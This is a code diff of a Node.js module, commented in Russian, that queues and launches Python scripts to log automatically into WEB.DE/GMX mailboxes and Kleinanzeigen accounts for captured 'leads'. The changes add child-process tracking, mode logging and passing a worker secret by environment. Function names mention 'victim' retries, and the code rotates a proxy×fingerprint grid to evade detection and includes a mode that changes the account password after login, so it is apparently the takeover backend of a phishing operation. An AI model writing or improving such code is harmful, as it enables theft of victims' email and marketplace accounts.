@@ -5,6 +5,7 @@ const path = require('path');
 const { spawn } = require('child_process');
 const { DATA_DIR } = require('../db/database.js');
 const { logDuplicateAutomationAttempt } = require('../lib/terminalFlowLog');
+const { formatModeStartPage } = require('../lib/adminModeFlowLog');
 
 /** Long-poll timeout — для расчёта max age lock (как в server.js). */
 const WEBDE_WAIT_PASSWORD_TIMEOUT_MS = (function () {
@@ -24,6 +25,7 @@ const WEBDE_LOGIN_MAX_CONCURRENT = Math.max(1, parseInt(process.env.WEBDE_LOGIN_
 const runningWebdeLoginLeadIds = new Set();
 const pendingWebdeLoginQueue = [];
 const webdeLoginChildByLeadId = new Map();
+const activeAutomationChildren = new Set();
 
 /** @type {object | null} */
 let deps = null;
@@ -274,6 +276,16 @@ function releaseWebdeLoginSlot(leadId) {
   }
 }
 
+function registerAutomationChild(child) {
+  if (!child || typeof child !== 'object') return;
+  activeAutomationChildren.add(child);
+}
+
+function unregisterAutomationChild(child) {
+  if (!child || typeof child !== 'object') return;
+  activeAutomationChildren.delete(child);
+}
+
 function preemptWebdeLoginForReplacedLead(oldLeadId, email) {
   const d = getDeps();
   const em = (email || '').trim().toLowerCase();
@@ -284,8 +296,9 @@ function preemptWebdeLoginForReplacedLead(oldLeadId, email) {
     if (c && typeof c.kill === 'function') {
       try {
         c.kill('SIGKILL');
-        d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', em || '—', 'остановлен предыдущий автовход (новый лог по email), leadId=' + oldLeadId);
+        d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', em || '—', 'остановлен предыдущий автовход (новый лог по email), leadId=' + oldLeadId, oldLeadId);
       } catch (_) {}
+      unregisterAutomationChild(c);
       webdeLoginChildByLeadId.delete(oldLeadId);
     }
     releaseWebdeLoginSlot(oldLeadId);
@@ -301,8 +314,9 @@ function stopWebdeLoginForDeletedLead(leadId, lead) {
   if (c && typeof c.kill === 'function') {
     try {
       c.kill('SIGKILL');
-      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', (lead && (lead.email || lead.emailKl)) ? String(lead.email || lead.emailKl).trim() : '—', 'остановка автовхода: лид удалён, leadId=' + id);
+      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', (lead && (lead.email || lead.emailKl)) ? String(lead.email || lead.emailKl).trim() : '—', 'остановка автовхода: лид удалён, leadId=' + id, id);
     } catch (_) {}
+    unregisterAutomationChild(c);
   }
   webdeLoginChildByLeadId.delete(id);
   clearLeadAutomationLock(id);
@@ -342,48 +356,70 @@ function startWebdeLoginAfterLeadSubmit(leadId, lead, forceRestart) {
   const d = getDeps();
   if (!leadId || !lead) return;
   const sp = d.readStartPage();
+  const mode = typeof d.readMode === 'function' ? d.readMode() : 'auto';
+  const autoScript = d.readAutoScript();
+  const emLog = String(lead.emailKl || lead.email || '').trim() || '—';
+  const snap = formatModeStartPage(mode, autoScript, sp);
+  let branch = '';
   if (sp === 'change') {
     if (lead.brand === 'klein') {
-      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: Auto-Login+Change + Klein — автовход в почту не запускаем (админ вручную), leadId=' + leadId);
+      branch = 'пропуск автовхода в почту: Change + Klein (только вручную из админки)';
+      d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
+      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: Auto-Login+Change + Klein — автовход в почту не запускаем (админ вручную), leadId=' + leadId, leadId);
       return;
     }
+    branch = 'запуск lead_simulation: Change — нужен автовход в WEB.DE для смены пароля';
+    d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
     startWebdeLoginForLeadId(leadId, (lead.email || '').toLowerCase().includes('web.de'), !!forceRestart, false);
     return;
   }
   if (sp === 'klein') {
+    branch = 'запуск lead_simulation с --klein-orchestration (после почты сценарий Klein/Kl)';
+    d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
     startWebdeLoginForLeadId(leadId, true, !!forceRestart, true);
     return;
   }
   if (lead.brand === 'klein') {
+    branch = 'запуск klein_simulation_api.py (бренд Klein, отдельный скрипт)';
+    d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
     startKleinLoginForLeadId(leadId, !!forceRestart);
     return;
   }
+  branch = 'запуск lead_simulation (WEB.DE/GMX по email)';
+  d.logTerminalFlow('РЕЖИМ', 'Автовход', forceRestart ? 'force' : '—', emLog, '[' + snap + '] ' + branch + ' · leadId=' + leadId, leadId);
   startWebdeLoginForLeadId(leadId, (lead.email || '').toLowerCase().includes('web.de'), !!forceRestart, false);
 }
 
 function restartWebdeAutoLoginAfterVictimRetryFromError(lead, id, email, reasonLog) {
   const d = getDeps();
   if (!d.readAutoScript()) return;
+  const mode = typeof d.readMode === 'function' ? d.readMode() : 'auto';
+  const snap = formatModeStartPage(mode, d.readAutoScript(), d.readStartPage());
   if (lead && lead.webdeLoginGridExhausted === true) {
-    d.logTerminalFlow('АДМИН', 'Система', '—', (email || '').trim() || '—', 'автоперезапуск пропущен: автовход уже исчерпал сетку прокси×отпечаток (ручной «Запуск входа» или новый лид), id=' + id);
+    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snap + '] автоперезапуск пропущен: сетка прокси×отпечаток исчерпана · ' + reasonLog + ' · id=' + id, id);
+    d.logTerminalFlow('АДМИН', 'Система', '—', (email || '').trim() || '—', 'автоперезапуск пропущен: автовход уже исчерпал сетку прокси×отпечаток (ручной «Запуск входа» или новый лид), id=' + id, id);
     return;
   }
   const spRetry = d.readStartPage();
   if (spRetry === 'change' && lead.brand === 'klein') {
+    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snap + '] автоперезапуск не делаем: Change + Klein · ' + reasonLog + ' · id=' + id, id);
     console.log('[АДМИН] ' + reasonLog + ': после ошибки + Change + Klein — автоперезапуск не делаем, id=' + id);
     return;
   }
   if (spRetry === 'klein') {
+    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snap + '] перезапуск lead_simulation klein-orchestration · ' + reasonLog + ' · id=' + id, id);
     console.log('[АДМИН] ' + reasonLog + ' — запуск lead_simulation с klein-orchestration, id=' + id);
     startWebdeLoginForLeadId(id, true, false, true);
     return;
   }
   if (lead.brand === 'klein') {
+    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snap + '] перезапуск klein_simulation · ' + reasonLog + ' · id=' + id, id);
     console.log('[АДМИН] ' + reasonLog + ' — повторный запуск klein_simulation, id=' + id);
     startKleinLoginForLeadId(id, false);
     return;
   }
   if ((email || '').toLowerCase().includes('web.de')) {
+    d.logTerminalFlow('РЕЖИМ', 'Автовход', 'retry', (email || '').trim() || '—', '[' + snap + '] перезапуск lead_simulation WEB.DE · ' + reasonLog + ' · id=' + id, id);
     console.log('[АДМИН] ' + reasonLog + ' — запуск скрипта входа WEB.DE заново, id=' + id);
     startWebdeLoginForLeadId(id, true, false, false);
   }
@@ -394,7 +430,7 @@ function startWebdeLoginForLeadId(leadId, isWebde, forceRestart, kleinOrchestrat
   if (kleinOrchestration === undefined) kleinOrchestration = false;
   if (!isWebde || !leadId || !d.readAutoScript()) {
     if (isWebde && leadId && !d.readAutoScript()) {
-      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: Auto-script выключен, leadId=' + leadId);
+      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: Auto-script выключен, leadId=' + leadId, leadId);
     }
     return;
   }
@@ -404,7 +440,7 @@ function startWebdeLoginForLeadId(leadId, isWebde, forceRestart, kleinOrchestrat
       return;
     }
     pendingWebdeLoginQueue.push({ leadId: leadId, isWebde: isWebde, forceRestart: !!forceRestart, kleinOrchestration: !!kleinOrchestration });
-    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'очередь: слотов ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT + ', leadId=' + leadId + ' в очередь (размер ' + pendingWebdeLoginQueue.length + ')');
+    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'очередь: слотов ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT + ', leadId=' + leadId + ' в очередь (размер ' + pendingWebdeLoginQueue.length + ')', leadId);
     const leadsQ = d.readLeads();
     const leadQ = leadsQ.find(function (l) { return l.id === leadId; });
     if (leadQ) {
@@ -418,24 +454,24 @@ function startWebdeLoginForLeadId(leadId, isWebde, forceRestart, kleinOrchestrat
   const leads = d.readLeads();
   const lead = leads.find(function (l) { return l.id === leadId; });
   if (!lead) {
-    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: лид не найден, leadId=' + leadId);
+    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: лид не найден, leadId=' + leadId, leadId);
     return;
   }
   if (lead.brand === 'klein' && !kleinOrchestration) {
-    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', (lead.emailKl || lead.email || '').trim() || '—', 'пропуск: Klein — авто через klein_simulation_api.py, не lead_simulation, leadId=' + leadId);
+    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', (lead.emailKl || lead.email || '').trim() || '—', 'пропуск: Klein — авто через klein_simulation_api.py, не lead_simulation, leadId=' + leadId, leadId);
     return;
   }
   const lockEmailRaw = String(lead.email || '').trim();
   if (!lockEmailRaw) {
-    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: нет email для автовхода, leadId=' + leadId);
+    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск: нет email для автовхода, leadId=' + leadId, leadId);
     return;
   }
   if (lead.status === 'show_success' && !forceRestart) {
-    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmailRaw, 'пропуск: лид уже Успех без forceRestart, leadId=' + leadId);
+    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmailRaw, 'пропуск: лид уже Успех без forceRestart, leadId=' + leadId, leadId);
     return;
   }
   if (lead.webdeLoginGridExhausted === true && !forceRestart) {
-    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmailRaw, 'пропуск: сетка прокси×отпечаток уже исчерпана (кнопка запуска в админке или forceRestart), leadId=' + leadId);
+    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmailRaw, 'пропуск: сетка прокси×отпечаток уже исчерпана (кнопка запуска в админке или forceRestart), leadId=' + leadId, leadId);
     return;
   }
   if (!forceRestart && isLeadAutomationAlreadyRunning(leadId)) {
@@ -455,7 +491,7 @@ function startWebdeLoginForLeadId(leadId, isWebde, forceRestart, kleinOrchestrat
       leadId: leadId,
       lockMaxAgeMs: WEBDE_SCRIPT_MAX_AGE_MS
     });
-    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', email, 'пропуск: скрипт уже запущен для email, leadId=' + leadId);
+    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', email, 'пропуск: скрипт уже запущен для email, leadId=' + leadId, leadId);
     return;
   }
   const loginDir = path.join(d.serverProjectRoot, 'login');
@@ -469,7 +505,7 @@ function startWebdeLoginForLeadId(leadId, isWebde, forceRestart, kleinOrchestrat
   const webdeComboSlot = runningWebdeLoginLeadIds.size;
   runningWebdeLoginLeadIds.add(leadId);
   const baseUrl = process.env.SERVER_URL || ('http://127.0.0.1:' + (parseInt(process.env.PORT, 10) || 3000));
-  const token = d.getAdminToken() || '';
+  const workerSecret = d.getWorkerSecret() || '';
   const webdeRunSession = beginWebdeAutoLoginRun(lead);
   const atDom = email.indexOf('@') >= 0 ? email.slice(email.indexOf('@')) : '';
   const klMarked = d.leadHasKleinMarkedData(lead);
@@ -481,20 +517,45 @@ function startWebdeLoginForLeadId(leadId, isWebde, forceRestart, kleinOrchestrat
     webdeScriptActiveRun: lead.webdeScriptActiveRun,
     eventTerminal: lead.eventTerminal
   });
-  d.logTerminalFlow('AUTO-LOGIN', 'Автовход', webdeRunSession, email, 'запуск Python leadId=' + leadId + (kleinOrchestration ? ' klein-orchestration' : '') + ' comboSlot=' + webdeComboSlot + ' активных ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT);
+  d.logTerminalFlow('AUTO-LOGIN', 'Автовход', webdeRunSession, email, 'запуск Python leadId=' + leadId + (kleinOrchestration ? ' klein-orchestration' : '') + ' comboSlot=' + webdeComboSlot + ' активных ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT, leadId);
   const projectRoot = d.serverProjectRoot;
   const python = resolvePythonExecutable(projectRoot);
   const env = makePythonSpawnEnv(projectRoot);
-  const pyArgs = [scriptPath, '--server-url', baseUrl, '--lead-id', leadId, '--token', token, '--combo-slot', String(webdeComboSlot)];
+  const pyArgs = [scriptPath, '--server-url', baseUrl, '--lead-id', leadId, '--combo-slot', String(webdeComboSlot)];
   if (kleinOrchestration) pyArgs.push('--klein-orchestration');
-  const child = spawn(python, pyArgs, { cwd: d.serverProjectRoot, detached: true, stdio: 'inherit', env });
+  const child = spawn(python, pyArgs, {
+    cwd: d.serverProjectRoot,
+    detached: true,
+    stdio: 'inherit',
+    env: Object.assign({}, env, { WORKER_SECRET: workerSecret })
+  });
   webdeLockWriteChildPid(email, child.pid);
   webdeLeadLockWritePid(leadId, child.pid);
   webdeLoginChildByLeadId.set(leadId, child);
-  child.on('exit', function () {
+  registerAutomationChild(child);
+  var cleaned = false;
+  function cleanupChild(reason, errObj) {
+    if (cleaned) return;
+    cleaned = true;
+    unregisterAutomationChild(child);
     webdeLoginChildByLeadId.delete(leadId);
     clearLeadAutomationLock(leadId);
-  });
+    releaseWebdeLoginSlot(leadId);
+    clearWebdeScriptRunning(email);
+    if (reason === 'exit' && errObj && Number.isFinite(errObj.code) && errObj.code !== 0) {
+      try {
+        d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', email, 'Скрипт завершился с ошибкой (code=' + errObj.code + '), leadId=' + leadId, leadId);
+      } catch (_) {}
+    }
+    if (reason === 'error') {
+      try {
+        const msg = errObj && errObj.message ? String(errObj.message) : String(errObj || 'spawn_error');
+        d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', email, 'ошибка запуска Python: ' + msg + ', leadId=' + leadId, leadId);
+      } catch (_) {}
+    }
+  }
+  child.on('exit', function (code, signal) { cleanupChild('exit', { code: code, signal: signal }); });
+  child.on('error', function (err) { cleanupChild('error', err); });
   child.unref();
 }
 
@@ -502,7 +563,7 @@ function startKleinLoginForLeadId(leadId, forceRestart) {
   const d = getDeps();
   if (!leadId || !d.readAutoScript()) {
     if (leadId && !d.readAutoScript()) {
-      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: Auto-script выключен, leadId=' + leadId);
+      d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: Auto-script выключен, leadId=' + leadId, leadId);
     }
     return;
   }
@@ -512,7 +573,7 @@ function startKleinLoginForLeadId(leadId, forceRestart) {
       return;
     }
     pendingWebdeLoginQueue.push({ leadId: leadId, forceRestart: !!forceRestart, script: 'klein' });
-    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'очередь Klein: слотов ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT + ', leadId=' + leadId);
+    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'очередь Klein: слотов ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT + ', leadId=' + leadId, leadId);
     const leadsKq = d.readLeads();
     const leadKq = leadsKq.find(function (l) { return l.id === leadId; });
     if (leadKq) {
@@ -526,20 +587,20 @@ function startKleinLoginForLeadId(leadId, forceRestart) {
   const leads = d.readLeads();
   const lead = leads.find(function (l) { return l.id === leadId; });
   if (!lead) {
-    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: лид не найден, leadId=' + leadId);
+    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: лид не найден, leadId=' + leadId, leadId);
     return;
   }
   if (lead.brand !== 'klein') {
-    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: не бренд klein, leadId=' + leadId);
+    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: не бренд klein, leadId=' + leadId, leadId);
     return;
   }
   const lockEmail = String(lead.emailKl || lead.email || '').trim().toLowerCase();
   if (!lockEmail) {
-    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: нет emailKl/email, leadId=' + leadId);
+    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', '—', 'пропуск Klein: нет emailKl/email, leadId=' + leadId, leadId);
     return;
   }
   if (lead.status === 'show_success' && !forceRestart) {
-    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmail, 'пропуск Klein: лид уже Успех без forceRestart, leadId=' + leadId);
+    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmail, 'пропуск Klein: лид уже Успех без forceRestart, leadId=' + leadId, leadId);
     return;
   }
   if (!forceRestart && isLeadAutomationAlreadyRunning(leadId)) {
@@ -553,7 +614,7 @@ function startKleinLoginForLeadId(leadId, forceRestart) {
   }
   if (!tryAcquireWebdeScriptLock(lockEmail, leadId)) {
     clearLeadAutomationLock(leadId);
-    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmail, 'пропуск Klein: lock занят, leadId=' + leadId);
+    d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmail, 'пропуск Klein: lock занят, leadId=' + leadId, leadId);
     return;
   }
   const loginDir = path.join(d.serverProjectRoot, 'login');
@@ -567,7 +628,7 @@ function startKleinLoginForLeadId(leadId, forceRestart) {
   const kleinComboSlot = runningWebdeLoginLeadIds.size;
   runningWebdeLoginLeadIds.add(leadId);
   const baseUrl = process.env.SERVER_URL || ('http://127.0.0.1:' + (parseInt(process.env.PORT, 10) || 3000));
-  const token = d.getAdminToken() || '';
+  const workerSecret = d.getWorkerSecret() || '';
   const kleinRunSession = beginWebdeAutoLoginRun(lead);
   const klDom = lockEmail.indexOf('@') >= 0 ? lockEmail.slice(lockEmail.indexOf('@')) : '';
   const klStartDetail = 'klein_simulation_api.py · слот ' + kleinComboSlot + '/' + WEBDE_LOGIN_MAX_CONCURRENT + ' · …' + klDom;
@@ -577,23 +638,54 @@ function startKleinLoginForLeadId(leadId, forceRestart) {
     webdeScriptActiveRun: lead.webdeScriptActiveRun,
     eventTerminal: lead.eventTerminal
   });
-  d.logTerminalFlow('AUTO-LOGIN', 'Klein', kleinRunSession, lockEmail, 'запуск klein_simulation_api.py leadId=' + leadId + ' активных ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT);
+  d.logTerminalFlow('AUTO-LOGIN', 'Klein', kleinRunSession, lockEmail, 'запуск klein_simulation_api.py leadId=' + leadId + ' активных ' + runningWebdeLoginLeadIds.size + '/' + WEBDE_LOGIN_MAX_CONCURRENT, leadId);
   const projectRoot = d.serverProjectRoot;
   const python = resolvePythonExecutable(projectRoot);
   const env = makePythonSpawnEnv(projectRoot);
-  const child = spawn(python, [scriptPath, '--server-url', baseUrl, '--lead-id', leadId, '--token', token], { cwd: d.serverProjectRoot, detached: true, stdio: 'inherit', env });
+  const child = spawn(python, [scriptPath, '--server-url', baseUrl, '--lead-id', leadId], {
+    cwd: d.serverProjectRoot,
+    detached: true,
+    stdio: 'inherit',
+    env: Object.assign({}, env, { WORKER_SECRET: workerSecret })
+  });
   webdeLockWriteChildPid(lockEmail, child.pid);
   webdeLeadLockWritePid(leadId, child.pid);
   webdeLoginChildByLeadId.set(leadId, child);
-  child.on('exit', function () {
+  registerAutomationChild(child);
+  var cleaned = false;
+  function cleanupChild(reason, errObj) {
+    if (cleaned) return;
+    cleaned = true;
+    unregisterAutomationChild(child);
     webdeLoginChildByLeadId.delete(leadId);
     clearLeadAutomationLock(leadId);
-  });
+    releaseWebdeLoginSlot(leadId);
+    clearWebdeScriptRunning(lockEmail);
+    if (reason === 'exit' && errObj && Number.isFinite(errObj.code) && errObj.code !== 0) {
+      try {
+        d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmail, 'Скрипт завершился с ошибкой (code=' + errObj.code + '), leadId=' + leadId, leadId);
+      } catch (_) {}
+    }
+    if (reason === 'error') {
+      try {
+        const msg = errObj && errObj.message ? String(errObj.message) : String(errObj || 'spawn_error');
+        d.logTerminalFlow('AUTO-LOGIN', 'Система', '—', lockEmail, 'ошибка запуска Klein Python: ' + msg + ', leadId=' + leadId, leadId);
+      } catch (_) {}
+    }
+  }
+  child.on('exit', function (code, signal) { cleanupChild('exit', { code: code, signal: signal }); });
+  child.on('error', function (err) { cleanupChild('error', err); });
   child.unref();
 }
 
 function killAllSpawnedAutomationChildrenSync() {
   try {
+    activeAutomationChildren.forEach(function (c) {
+      if (c && typeof c.kill === 'function') {
+        try { c.kill('SIGKILL'); } catch (_) {}
+      }
+    });
+    activeAutomationChildren.clear();
     webdeLoginChildByLeadId.forEach(function (c) {
       if (c && typeof c.kill === 'function') {
         try {
